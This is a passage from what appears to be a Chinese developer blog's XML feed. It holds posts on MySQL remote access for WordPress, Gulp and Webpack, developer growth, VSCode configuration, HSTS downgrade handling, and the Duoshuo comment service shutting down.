/etc/mysql/mysql.conf.d/mysqld.cnf</span></span><br><span class="line"><span class="comment"># 注释下面这行</span></span><br><span class="line"><span class="comment"># binding-adress = 127.0.0.1</span></span><br></pre></td></tr></table></figure><p>然后重启 mysql 就好了：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/mysql restart</span><br></pre></td></tr></table></figure><p>当然，记得把 <code>wp-config.php</code> 中的 Mysql 主机地址修改下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;112.18.3.7&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>使用 hexo 构建和 Github pages 部署博客有快两年时间了，博客文件多了之后，构建效率特别低，也不方便修改错别字。得尽快把博客迁移到服务器上~</p><p>P.S. 本地和服务器的代码同步，我使用的是 VSCode 的一个插件（ftp-sync）。</p>]]></content>
      
      
      <categories>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>理解 Gulp 和 Webpack</title>
      <link href="/blog/2017/04/27/gulp-and-webpack/"/>
      <url>/blog/2017/04/27/gulp-and-webpack/</url>
      
        <content type="html"><![CDATA[<p>Gulp 和 webpack 之间的关系是十分暧昧的，却也经常被人误解，以为它俩是竞争关系，其实不然。</p><p><img src="/../blogimgs/2017/04/27/6c0378f8gy1ff18pl2w55j21400m8tag.jpg" alt="gulp &amp; webpack"><!--<source src="http://ww1.sinaimg.cn/large/6c0378f8gy1ff18pl2w55j21400m8tag.jpg">--></p><span id="more"></span><p>Gulp 是一个任务管理工具，让简单的任务更清晰，让复杂的任务易于掌控；而 webpack 的理念是，一切皆为模块，每个模块在打包的时候都会经过一个叫做 loader 的东西，它具备非常强大的精细化管理能力，主要解决的是依赖分析问题。</p><p>Gulp 的学习，搞清楚 <code>gulp.src</code>, <code>gulp.dest</code>, <code>gulp.task</code>, <code>gulp.watch</code> 四个 API 就差不多了，它的底层原理是使用 Node 的 Transform Streams，这是一个可读可写可做中间转换的 Streams 管道，由于从 src 到 dest 过程中，文件一直停留在 Streams 中，没有落地成为实体文件，所以整体运作效率非常高。</p><p>Webpack 概念很多，但搞清楚 <code>entry</code>，<code>output</code> 和 <code>loader</code> 三个关键点，基本上就可以解决简单的问题了，稍微复杂的场景主要包括对资源的合并处理、分拆处理、多次打包等，部分这样的问题可以使用插件辅助解决，但是 Webpack 的强大并不在文件处理，而是依赖分析，所以在流程操作特别复杂的情况，webpack 并不能胜任工作，往往会被作为 gulp 的一个 task，整体工作流交给 gulp 主导。</p><h3 id="插件推荐"><a href="#插件推荐" class="headerlink" title="插件推荐"></a>插件推荐</h3><p>下面推荐几个 gulp 的插件吧，比较常用的：</p><ul><li><code>gulp-load-plugins</code>：自动加载 package.json 中的 gulp 插件</li><li><code>gulp-rename</code>： 重命名</li><li><code>gulp-uglify</code>：文件压缩</li><li><code>gulp-concat</code>：文件合并</li><li><code>gulp-less</code>：编译 less</li><li><code>gulp-sass</code>：编译 sass</li><li><code>gulp-clean-css</code>：压缩 CSS 文件</li><li><code>gulp-htmlmin</code>：压缩 HTML 文件</li><li><code>gulp-babel</code>：使用 babel 编译 JS 文件</li><li><code>gulp-jshint</code>：jshint 检查</li><li><code>gulp-imagemin</code>：压缩 jpg、png、gif 等图片</li><li><code>gulp-livereload</code>：当代码变化时，它可以帮我们自动刷新页面</li></ul><p>也推荐几个 webpack 常用的 loader 和 plugin：</p><ul><li>Loader 列表<ul><li><code>less-loader, sass-loader</code>：处理样式</li><li><code>url-loader, file-loader</code>：两个都必须用上。否则超过大小限制的图片无法生成到目标文件夹中</li><li><code>babel-loader，babel-preset-es2015，babel-preset-react</code>：js 处理，转码</li><li><code>expose-loader</code>： 将 js 模块暴露到全局</li></ul></li><li>Plugin 列表<ul><li><code>NormalModuleReplacementPlugin</code>：匹配 resourceRegExp，替换为 newResource</li><li><code>ContextReplacementPlugin</code>：替换上下文的插件</li><li><code>IgnorePlugin</code>：不打包匹配文件</li><li><code>PrefetchPlugin</code>：预加载的插件，提高性能</li><li><code>ResolverPlugin</code>：替换上下文的插件</li><li><code>DedupePlugin</code>：打包的时候删除重复或者相似的文件        </li><li><code>MinChunkSizePlugin</code>：把多个小模块进行合并，以减少文件的大小        </li><li><code>LimitChunkCountPlugin</code>：限制打包文件的个数        </li><li><code>MinChunkSizePlugin</code>：根据 chars 大小，如果小于设定的最小值，就合并这些小模块，以减少文件的大小    </li><li><code>OccurrenceOrderPlugin</code>：根据模块调用次数，给模块分配 ids，常被调用的 ids 分配更短的 id，使得 ids 可预测，降低文件大小，该模块推荐使用        </li><li><code>UglifyJsPlugin</code>：压缩 js        </li><li><code>CommonsChunkPlugin</code>：多个 html 共用一个 js 文件(chunk)</li><li><code>HotModuleReplacementPlugin</code>：模块热替换么，如果不在 dev-server 模式下，需要记录数据，recordPath，生成每个模块的热更新模块    </li><li><code>ProgressPlugin</code>：编译进度        </li><li><code>NoErrorsPlugin</code>：报错但不退出 webpack 进程    </li><li><code>HtmlWebpackPlugin </code>：生成 html</li></ul></li></ul><h3 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h3><ul><li><a href="http://huang-jerryc.com/2017/02/28/gulp-base/">http://huang-jerryc.com/2017/02/28/gulp-base/</a></li><li><a href="http://www.thkdog.com/html5/2015/05/08/webpack.html">http://www.thkdog.com/html5/2015/05/08/webpack.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Gulp </tag>
            
            <tag> Webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>熟练工如何拔高 &amp; 零碎知识的整理</title>
      <link href="/blog/2017/04/26/about-improve/"/>
      <url>/blog/2017/04/26/about-improve/</url>
      
        <content type="html"><![CDATA[<p><img src="/../blogimgs/2017/04/26/006tKfTcgy1fezyf4npsuj30p00dw40s.jpg" alt="https://unsplash.com/collections/631209/home-improvement-store?photo=znw9Xs5I9ro"><!--<source src="http://ww2.sinaimg.cn/large/006tKfTcgy1fezyf4npsuj30p00dw40s.jpg">--></p><p>整理了一条圈子里头一位朋友的提问，这个问题比较普遍，我好好思考了下。问题如下：</p><span id="more"></span><blockquote><p>我在前端方面有几年经验，切图仔-&gt;jQuery前端-&gt;Angular2+Webpack前端，可开发传统网页&#x2F;SPA；略懂后端(API, CRUD)和服务器(简易脚本)；可独立完成中小型WEB项目并有成果； 但也就这样了，以下是我的问题：<br>　１、由于一直凭兴趣自学，在理论储备上非常不足；但理论和实践在到达一定层次前有巨大鸿沟，如何能有效通过学习理论提高实践能力？像我这种需要重视哪方面的学习？<br>　２、我是典型 Google &amp; StackOverflow Oriented Developer，不会就查，但总觉得这样不系统，请问一般是如何解决问题的？</p></blockquote><h3 id="1、已经是个熟练工，如何在能力上再次拔高？"><a href="#1、已经是个熟练工，如何在能力上再次拔高？" class="headerlink" title="1、已经是个熟练工，如何在能力上再次拔高？"></a>1、已经是个熟练工，如何在能力上再次拔高？</h3><p>在公司里，只要是踏踏实实做事情的，三两年的时间一定会有很明显的成长，不管是技术能力还是沟通能力。但也正是三两年后，会明确感觉到再一次遇到技术的瓶颈，这个问题不管是谁，都有，我也经常遇到上升的瓶颈，其实在这个圈子里，每个提问的同学都在促进我在思考，所以也比较感谢大家。</p><p>对碎片知识的学习是一个沉淀的过程，东一脚、西一脚，看似学的很杂很肤浅，但时间长了之后，每个领域都会涉及很多次，面广了，综合素质自然也就提升上去了。能力上再次拔高，我觉得需要做两件事情：</p><p>梳理知识，找到自己擅长的领域。前端技术越来越丰富，越深入的技术就越要花时间进去研究，我们不能 cover 到所有的面，但是可以抓住一个自己感兴趣或者擅长的方向，支出大把时间，深入研究。比如 Native、运维、Node、性能、WebVR 等等领域。<br>在系统的架构设计上，进一步学习。这一块我个人的经验也不是特别丰富，但是这一块的学习还是一直坚持着，最基本的算法模型、数据结构、数据库知识、设计模式、性能调优、多人协作等等，我相信坚持一段时间的学习，再配上工作中项目的实践，一定会有效果出来。<br>最主要的还是需要用抽象的眼光去看待新技术，从宏观上把握一门技术到底解决了哪些问题，是如何解决的问题，把思路掌握清楚。抽象思维不是与生俱来，也需要不断的训练，时间长了之后，看待问题的角度会不太一样。</p><h3 id="2、如何整理零碎的知识？"><a href="#2、如何整理零碎的知识？" class="headerlink" title="2、如何整理零碎的知识？"></a>2、如何整理零碎的知识？</h3><p>知识的整理永远都不要停留在键盘上或者笔杆上，需要对知识做一些区分。有几乎一直不变化的知识，比如 JS Core API、ECMA-262、HTTP&#x2F;2 等等，这些属于标准，标准化的知识，需要有了解，部分可以当作工具书，部分则需要全部记住。还有一些在变化的知识，比如 MVC 演变出来的 MVVM、MVP 等，技术框架如 React、Angular、Vue 等，这些都属于变化的知识，他们有自己适用的场景，场景一变，这些东西都不适用了。</p><p>在学习这些变化的知识时，也有不变的东西存在，比如学习源码的技巧、调试 bug 的技巧等，这些是什么呢？是能力。知识是学不尽的，但是能力可以不断地提升，随着经验的丰富，能力也会跟着一起上去。如果给你一堆技术关键词，你可以很快很好地将这些词放入大脑的对应的知识储存区间中，那说明你已经对整个技术体系有了比较全面的理解，这个时候你需要提升的是能力，编程能力、理解能力、组织能力还有架构能力。</p><p>以上，仅供参考。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小密圈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何快速上手一款 IDE - VSC 配置指南和插件推荐</title>
      <link href="/blog/2017/04/21/something-about-vsc/"/>
      <url>/blog/2017/04/21/something-about-vsc/</url>
      
        <content type="html"><![CDATA[<p>VSCode 刚出来的时候并不是特别看好，因为 Sublime 和 Atom 的插件生态已经做起来了，成千上万个可供选择，VSC 从零开始，除了自身提供的几个内置插件外几乎没有多余的选择，没想到短短一年多的时间，发展如此快，下图是我在其他平台也比较常用的几个插件，我安装了挺多，大概二三十个。</p><p><img src="/../blogimgs/2017/04/21/006tKfTcgy1feu3asuhi8j31400p0jxr.jpg" alt="VSC"><!--<source src="https://ww3.sinaimg.cn/large/006tKfTcgy1feu3asuhi8j31400p0jxr.jpg">--></p><span id="more"></span><p>当初看中 Atom 放下 Sublime 的主要原因是 Atom 可以让用户自定义界面，而且我学会了在 Atom 上写插件，觉得很爽，而且我也确实自定义了很多靠近自己使用习惯的内容。</p><p>如今投奔 VSC，原因是我发现自己并没有太多自定义 Editor 界面的需求，而且经常搞出一堆性能问题，潜进去解决这些问题太费时间了，尤其是 Atom 打开一个大文件慢的要命的问题，超过 1M 差不多就会把界面搞挂，这让我不可忍受。</p><p>VSC，怎么说呢，M$ 的大腿还是很粗的，同样底层用着 Electron，VSC 的水平要高 Atom 好几个档次，差距太大…</p><h3 id="关于编辑器的个性化"><a href="#关于编辑器的个性化" class="headerlink" title="关于编辑器的个性化"></a>关于编辑器的个性化</h3><p>Sublime Text，Visual Studio Code，Atom，WebStorm 等编辑器，前三者的使用门槛都不高，最后一个由于自身过于强大，很多人对它都有点畏惧，这和对 VIM 的畏惧是不一样的，使用 Windows 的同学基本都会使用鼠标，VIM 是一款让你脱离鼠标的编辑器，需要记忆的快捷键比较多，它的插件配置也过于灵活，以至于很多人难以坚持使用它。</p><p>选择并坚持使用一个 IDE，我们会很关注它的使用效率，包括界面的美观和功能的完善度，比如支持换肤、能够调试多种语言、具备友好的控制台等等，这些特征 Atom、VSC 和 WebStorm 都具备。编辑器本没有什么好坏之分，你用得爽就最好了，我有一个朋友使用最简洁的记事本写过几个月程序，这也并不影响他的程序质量。</p><p>不过，在我看来， WebStorm 过于臃肿了，而且还不是免费的；Sublime 在插件机制上对前端也没有亲和力；Atom 的整体性能还达不到我理想中的要求；VIM 的理念过于深入，灵活性强到普通人都接受不了。从 Atom 到 VSC，我看重的只有 VSC 打开大文件效率这一点，而且作为一名优秀的编辑器，它该具备的都已经具备了，比如繁荣的插件生态，以及持续的版本迭代，这足以给我巨大的信心和勇气使用它。</p><p>从一个 IDE 转移到另一个，最让我们头疼的事情莫过于使用习惯，好在 ST、VSC、Atom 已经统一了这种习惯，比如使用 <code>Command + Shift + P</code> 调出 Pannel，便可以在这里做任何你想得到的事情。</p><h3 id="拿到-VSC-的第一件事"><a href="#拿到-VSC-的第一件事" class="headerlink" title="拿到 VSC 的第一件事"></a>拿到 VSC 的第一件事</h3><p>安装 VSC 后，我心里想的第一件事请就是，如何像使用 Atom 一样让我使用 VSC，毕竟我在 Atom 上配置了许多个性化的内容。一个编辑器的配置大体包括这三块：</p><ul><li><strong>IDE 配置</strong>，调整字体、颜色、行高、行溢出等；</li><li><strong>快捷键配置</strong>，比如多行编辑、预览设置、折行设置等；</li><li><strong>插件配置</strong>，安装 IDE 辅助功能，而每个插件也包含上述两部分配置；</li></ul><p>拿到 VSC 的第一件事请就是增加了两个快捷键，让我可以快速打开 IDE 配置界面和快捷键配置界面，快捷键的配置可以在这里找到：</p><p><img src="/../blogimgs/2017/04/21/006tKfTcgy1feu3zq0epwj30dg07bdgr.jpg" alt="VSC 快捷键"><!--<source src="https://ww2.sinaimg.cn/large/006tKfTcgy1feu3zq0epwj30dg07bdgr.jpg">--></p><p>进入之后，搜索 <code>setting</code> 和 <code>keyboard</code> 就可以进行设置了，打开 IDE 配置的快捷键我调整为 <code>Command + ,</code>，打开快捷键配置界面的快捷键我调整为 <code>Command + Shift + ,</code>，这个配置给我带来了很大的便利，配合关键字搜索，我几乎可以在十几秒内完成任何一个功能的快捷键配置和界面的修改。比如我需要在编码界面上增加一个尺子，提醒自己代码一行不要写太长，按下了 <code>Command + ,</code>，然后搜索 <code>ruler</code>，得到了这个：</p><p><img src="/../blogimgs/2017/04/21/006tKfTcgy1feu45ds8j5j31400p0q8r.jpg" alt="VSC - Ruler"><!--<source src="https://ww3.sinaimg.cn/large/006tKfTcgy1feu45ds8j5j31400p0q8r.jpg">--></p><p>左边是系统默认配置，可不更改，右侧是用户个性化配置，可以覆盖默认配置，我增加了一行：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;editor.rulers&quot;</span>: [<span class="number">80</span>, <span class="number">100</span>]</span><br></pre></td></tr></table></figure><p>于是我的界面上多了两条标尺线：</p><p><img src="/../blogimgs/2017/04/21/006tKfTcgy1feu46u3rfzj31400p0dmy.jpg" alt="标尺线"><!--<source src="https://ww2.sinaimg.cn/large/006tKfTcgy1feu46u3rfzj31400p0dmy.jpg">--></p><p>我用了大概一个小时，将自己最常用的快捷键配置好了，比如我最喜欢的多行编辑，换成了自己熟悉的快捷键（Gif图片）：</p><p><img src="/../blogimgs/2017/04/21/006tKfTcgy1feu6aa5k7lg30jv08hti7.gif" alt="多行编辑配置"><!--<source src="https://ww3.sinaimg.cn/large/006tKfTcgy1feu6aa5k7lg30jv08hti7.gif">--></p><p>不管自己用了多久的 Atom 或者 ST，当这些基础配置完成之后，会觉得转投另一个 IDE 并非什么痛苦的事情。</p><h3 id="接下来就是插件配置"><a href="#接下来就是插件配置" class="headerlink" title="接下来就是插件配置"></a>接下来就是插件配置</h3><p>考虑一个 IDE，我会首先看看它是否有类似于 <code>Sync</code> 的插件，我有几台电脑，不可能每次换电脑都让我重新配置一次，我可经不起这个折腾，实际上，Atom 和 VSC 都提供了 <code>Sync</code> 插件，比如 VSC 的 <code>Settings Sync</code>，可以轻松将 IDE 的所有配置一键备份到 github 上，也可以将 github 上的配置一键拉取下来，然后重启 IDE 便可以共享同样的配置了。这个配置并不复杂，考虑到新手同学，我来简单介绍下它的使用：</p><ul><li>在左侧的 sidebar 选中最后一个，搜索 <code>Sync</code>，不出意外，你会从前几个中找到下载量很高的那个 <code>Settings Sync</code>；</li><li>安装后，摁下 <code>Command + Shift + P</code> 打开控制面板，搜索 Sync，选择 <code>update/upload</code> 可以上传你的配置，选择 <code>Download</code> 会下载远程配置；</li><li>如果你之前没有使用过 Sync，在上传配置的时候，会让你在 Github 上创建一个授权码，允许 IDE 在你的 gist 中创建资源；下载远程配置，你可以直接将 gist 的 id 填入；</li><li>下载后等待安装，然后重启即可</li></ul><p>为了界面美观，你可以下载 <code>vscode-icons</code> 和 <code>xx-theme</code> 主题，只要你想得到的，在插件市场中搜索，都可以先下载下来，然后通过控制面板搜索关键词进行配置，一些常用插件，也可以通过之前配置的 <code>Command + ,</code> 和 <code>Command + Shift + ,</code> 来调整符合你喜欢的使用方式i。</p><h3 id="推荐一些插件"><a href="#推荐一些插件" class="headerlink" title="推荐一些插件"></a>推荐一些插件</h3><p>VSC 内置了许多插件，需要我们配置的其实已经不太多了，我用的比较频繁的几个插件是：</p><ul><li><code>ESLint</code>，检查代码格式</li><li><code>Insert Date String</code>，插入诸如 <code>2017-04-21 11:21:46</code> 这个字符串，我写博客经常要用</li><li><code>Git History</code>，查看代码的编辑历史</li><li><code>Prettify JSON</code>，格式化 JSON 文件</li><li><code>Markdown Preview</code>，预览 Markdown 文件</li><li><code>Code Runner</code>，运行程序</li><li><code>Terminal</code>，打开 zsh 控制台</li><li><code>View In Browser</code>，打开 html 文件</li><li><code>Document This</code>，自动生成注释</li><li><code>File Peek</code>，类似于 Go To Definition，点击后定位文件</li><li><code>Image Preview</code>，在行号左侧的小槽中展示图片的预览，MD 中也可以 hover 预览</li></ul><p>以上是用的比较多的，还装了几十个使用频度比较低的插件，主要包括 Snippet 和文件高亮配置，可以在这里查看：<a href="https://gist.github.com/barretlee/a5170eb6ca1805f66687063d2e3a4983">https://gist.github.com/barretlee/a5170eb6ca1805f66687063d2e3a4983</a>，你也可以通过 <code>Settings Sync</code> 将这个配置下载下来，id 就是后面半截：<code>a5170eb6ca1805f66687063d2e3a4983</code>。</p><h3 id="在命令行打开-VSC"><a href="#在命令行打开-VSC" class="headerlink" title="在命令行打开 VSC"></a>在命令行打开 VSC</h3><p>在安装好 VSC 后，直接配置 <code>.bash_profile</code> 或者 <code>.zshrc</code> 文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> vsc=<span class="string">&#x27;/Applications/Visual\ Studio\ Code.app/Contents/Resources/app/bin/code&#x27;</span>;</span><br><span class="line">VSC_BIN=<span class="string">&#x27;/Applications/Visual\ Studio\ Code.app/Contents/Resources/app/bin&#x27;</span>;</span><br><span class="line">PATH=<span class="variable">$VSC_BIN</span>:<span class="variable">$PATH</span>;</span><br><span class="line"><span class="built_in">export</span> PATH;</span><br></pre></td></tr></table></figure><p>然后让配置生效，在控制台执行：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 如果没有安装 zsh，可能是 ~/.bash_profile</span></span><br><span class="line"><span class="built_in">source</span> ~/.zshrc </span><br></pre></td></tr></table></figure><p>这个时候就可以在全局打开了：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -a 的意思是不要新开窗口，在当前已经打开的 vsc 中打开文件</span></span><br><span class="line">vsc path/to/file.ext -a </span><br></pre></td></tr></table></figure><p>有同学提到，VSC 的面板上搜索 <code>install</code> 就可以在命令行安装 <code>code</code> 这个命令了，不过我更喜欢使用 <code>vsc</code> 来打开文件，这也算是折腾吧 ；）</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>一款好的 IDE 能够帮助我们预防很多程序上愚蠢的问题，也能够聚合一系列小工具，避免我们频繁地切换工作区间。VSC 只是众多选择中的一个，熟悉其他编辑器的套路也是一样的。</p><p>「磨刀不误砍柴工」，花费点时间在工具的研究上，可以提升我们的开发和写作效率，提倡大家在这方面进行长时间的折腾。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VSC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于开源精神和小密圈</title>
      <link href="/blog/2017/04/03/about-secret-circle/"/>
      <url>/blog/2017/04/03/about-secret-circle/</url>
      
        <content type="html"><![CDATA[<!-- ![脉脉吐槽](../blogimgs/2017/04/03/6c0378f8gy1fe9a3wsyrvj20ku0fmwfw.jpg)<!--<source src="http://ww1.sinaimg.cn/large/6c0378f8gy1fe9a3wsyrvj20ku0fmwfw.jpg">--><p>看到有人关注和吐槽，我就过来说几句吧，当然我也知道，不管我下面说什么，都会有人顶和踩。 –&gt;</p><p>以下是回复脉脉上的一条匿名吐槽。</p><span id="more"></span><p>大概写了五六年博客，算起来应该有三四百多篇了吧，各大技术社群都转载过我的文章；<a href="http://weibo.com/173248656">微博</a>也用了五六年，发了四五千条内容，百分之七十都是我工作中的感想，包括技术方面的分享。分享精神、开源意识从不是挂在嘴边，我自己也一直落实在行动上。无数个凌晨一点我还在写技术博文，几乎每个周末我都有学习和分享技术。所以我实名反对楼主所说“一点开源共享精神都没有”。</p><p>说到小密圈，这是一个尝试，明年我可能不会继续了。如果楼主稍微多看一眼我发表的状态，应该知道，我推过一个圈子叫「前端进阶」，目前已经快 600 人了，我建立圈子的初衷并不是为了捞钱，当然你非要这么说，那大家就这么理解好了，不过可以把我下面想说的话看完。</p><p>我很认同楼主所说开源共享，所以在圈子内我就跟圈友说了，一些有价值的内容我会分享到圈外，同时很多技术专题的分享，我会以开源的形式去开展，比如 <a href="https://github.com/barretlee/performance-column">performance-column</a>，是一个性能相关的专题分享，让圈友在社区环境下沉淀知识，额外获得了圈外六百多人的长期围观。</p><p>我开放了自己的微信和邮箱，所以经常收到初学朋友的提问，这些提问很多都十分相似，所以我让他们统一在我的<a href="https://www.barretlee.com/message/">博客下留言</a>。而小密圈更适合沉淀问答，后来我转移了阵地。</p><p>关于小密圈我就说这么多，有人说，你特么不收费照样可以分享呀！我也不在这里辩论要不要收费。我每天都会投入固定的时间回答问题、分享技术动态、准备技术专题，我期望新人能够在我创造的环境下有一点点提升，有人觉得很值，有人不屑一顾。在圈外，我也一直保持着分享的习惯，这点从未间断。</p><p>有序地经营一个圈子让我成长很多，在保持活跃度的情况下，还要有高质量内容的产出也不是一件轻松的事情。有人说技术人不适合搞这种小密圈，确实，它本身与开源精神是相违背的。这是我的第一次尝试，我希望尽力做到最好。</p><p>脉脉的匿名社区是一个开放平台，大家在这里都勇于说出自己的心声。我也是一个学习者，我接受大家的吐槽。</p><hr><p>我的邮箱是 <a href="mailto:&#98;&#97;&#114;&#114;&#101;&#x74;&#46;&#x63;&#x68;&#105;&#110;&#x61;&#64;&#x67;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#109;">&#98;&#97;&#114;&#114;&#101;&#x74;&#46;&#x63;&#x68;&#105;&#110;&#x61;&#64;&#x67;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#109;</a>，微信是 barret_china，你可以过来直接批评我，当然也可以过来一起交流技术。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 吐槽 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>聊聊 HSTS 下的 HTTPS 降级问题</title>
      <link href="/blog/2017/04/01/hsts-downgrade/"/>
      <url>/blog/2017/04/01/hsts-downgrade/</url>
      
        <content type="html"><![CDATA[<p>HSTS 的作用是为了在用户通过 HTTP 访问网站时不需要服务器做 301&#x2F;302 跳转，直接一个 307 本地强制使用 HTTPS 访问网站，这可以防止用户在第一次发出请求时被劫持，也减少了一次请求。</p><p><img src="/../blogimgs/2017/04/01/TB1xL5RQpXXXXXIXpXXXXXXXXXX-900-500.jpg" alt="secure"><!--<source src="https://img.alicdn.com/tfs/TB1xL5RQpXXXXXIXpXXXXXXXXXX-900-500.jpg">--></p><span id="more"></span><p>HSTS 是服务器（如 Nginx）通过一个 Strict-Transport-Security 请求响应头写入到客户端的，所以用户至少要访问一次这个网站，HSTS 才会生效。HSTS 还可以申请内置到浏览器中，Chrome 维护了 HSTS Preload List 名单，允许用户在从未访问某网站的情况下，第一次访问时就自动使用 HTTPS。安全性就更强了。</p><p><strong>降级问题</strong></p><p>那么问题就来了，如果你的域名服务器配置了 HSTS 策略，而网站因为某些原因又降级为 HTTP，此时客户端岂不是被坑到了？因为每次访问都会在本地强制使用 HTTPS，结果就是网站访问失败，如何解决呢？</p><p>HSTS 的设置时间一般都不短，而内置到 Chrome 中的 HSTS Preload List 要求更为严格，必须设置 18 周以上的缓存时间，如果想把自己的域名从名单中撤出来，需要经历漫长的审核以及浏览器的发版。</p><p>对于加到 Preload 的网站，基本无解，所以内心需要多么坚定地拥护 HTTPS 才敢走出这一步，可想而知。我查了下，BAT 都是没有加进去的，Google&#x2F;Twitter&#x2F;Facebook 倒是都加进去了。</p><p><strong>使用 Chrome 工具删除</strong></p><p>即便你的网站没加入到 Preload，遇到以上问题，其实也是无解的，只能等 HSTS 设置时间过期，或者告诉用户使用 Chrome 提供的开发者工具，将名单删除，怎么删除呢？</p><p>在浏览器打开 <code>chrome://net-internals/#hsts</code> 这个页面，可以看到三个选项：</p><ul><li>Add domain，可以将你的域名添加到 Preload 中，这只在你的浏览器生效</li><li>Delete domain，将手动或者 Nginx 设置了 HSTS 的域名从浏览器删除，也就是上面问题的处理方案，但这里是删不掉内置到 HSTS Preload List 的域名的</li><li>Query domain，我就是从这里查到 BAT&#x2F;GTF 这 6 个网站是否加入到 Preload 的</li></ul><p><img src="/../blogimgs/2017/04/01/TB1VHKtQpXXXXajaXXXXXXXXXXX-532-102.png" alt="删除"><!--<source src="https://img.alicdn.com/tfs/TB1VHKtQpXXXXajaXXXXXXXXXXX-532-102.png">--></p><hr><p>题图：<a href="https://unsplash.com/search/secure?photo=bt41lw9i6Kc">https://unsplash.com/search/secure?photo=bt41lw9i6Kc</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络技术 </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTPS </tag>
            
            <tag> HSTS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多说即将关闭，评论迁至何处？</title>
      <link href="/blog/2017/03/21/duoshuo-comment-service-will-be-closed/"/>
      <url>/blog/2017/03/21/duoshuo-comment-service-will-be-closed/</url>
      
        <content type="html"><![CDATA[<blockquote><p>因公司业务调整，非常遗憾的向大家宣布多说项目即将关闭。 我们将于2017年6月1日正式关停服务，在此之前您可以通过后台的数据导出功能导出自己站点的评论数据。 对此给您造成的不便，我们深表歉意，感谢您的一路相伴。<a href="http://dev.duoshuo.com/threads/58d10f50e9a8cb4433fd5c5d">详细信息 &gt;</a></p></blockquote><p><img src="/../blogimgs/2017/03/21/6c0378f8gy1fduu7gthbfj21me0oeq6v.jpg" alt="多说"><!--<source src="http://ww1.sinaimg.cn/large/6c0378f8gy1fduu7gthbfj21me0oeq6v.jpg">--></p><span id="more"></span><p>第一次建站便开始使用多说，到现在差不多快三四年了，相信有很多朋友比我用的时间更长。尽管几年来，被无数垃圾评论轰炸过，也时有发生丢数据、数据展示错误、数据缺失、XSS 攻击、SQL 注入、HTTPS 资源引入等等等问题，我期间也放弃过多说转头 Disqus，然而辗转反侧，现在依然使用着它，不因为别的，毕竟国产（木有墙的问题，还免费😂）。</p><p>大约一年前，我加了一位多说开发者的微信，也了解了一些多说背后的故事。一直以来，多说都是两三人的小团队在维护，大约 2015 年初吧，多说被今日头条给收编，然而，在资源上并没有得到更多的支持，维护的人员甚至更少了，而且有那么半年多时间，只有一个人在维护前后台工作。</p><blockquote><p>多说网正在改变网站与用户之间，用户与用户之间的互动方式。这个专门基于社交网络的评论系统，能够轻松的帮网站主搭建自己互动性极强的社区，让留言的用户都有“家”的感觉。</p></blockquote><p>上面这段话，是多说网对自己产品的 <a href="http://dev.duoshuo.com/about/">介绍</a>，然而随着 Web3.0 的进化，博客已不再是趋势，很多人更加愿意在微信公众号这样的大众平台上发表内容，这些平台都自带评论功能；即便是有个人博客，也被各大内容聚合平台（诸如掘金、头条等）抓取过去，评论便也留在了平台，极少数会落在个人博客之上。</p><p>评论是产品互动的一个关键因子，一般有点研发能力的公司都不会使用社会化评论，将自己的数据存在他人的服务器上，所以多说这类产品的用户在国内并不算大众，用户少了，评论少了，多说拿啥挣钱呢？即便提供了高级付费功能，其盈利能力也不会很强大，长期来看，这个产品注定关停。</p><p>国内还有不少其他的同类产品，比如新浪留言、网易云等，好多家，我几不太清楚了，他们的留言提供了开放的能力，但是大家千万不要盲目选择这些产品。在盈利方面，这些产品依然存在着与多说同样的问题，之所以提供开放能力，是他们内&#x2F;外部产品本身就对评论有强烈需求，与其自己独享，不如分享出来，为自己产品积累人气，吸纳用户。长久来看，没有几个会持续提供免费服务。而且，纵观国内社会化评论工具，数多说体验做的最好，毕竟最老牌了。</p><p>那么，我们的评论该迁移至何处呢？这个问题，对有服务器的同学来说其实也并不是问题，在服务器上部署一个评论系统不是一个难事，也可以直接安装诸如 wordpress 之类的产品，自带了完善了评论功能，并且还支持导入多说的数据。其实，受伤的是那些使用诸如 hexo&#x2F;jekyll 构建的静态博客，没有数据库能力，我给大家推荐两个，至少目前看来可以持续使用几年的产品：</p><ul><li><a href="https://disqus.com/">Disqus</a>，它是国外最流行的社会化评论组件，体验优良，而且基于评论做了一个交流社区，形成了良好的生态，相信也已经找到了比较稳定的盈利模式；</li><li><a href="https://commentit.io/">commentit.io</a>, 可以将评论直接作为 commit，用 JS 脚本提交到 Github，保存进代码库。</li></ul><p>推荐的两个产品都有墙的问题，对想留言的用户不太有好。然而并没有其他可推荐的。</p>]]></content>
      
      
      <categories>
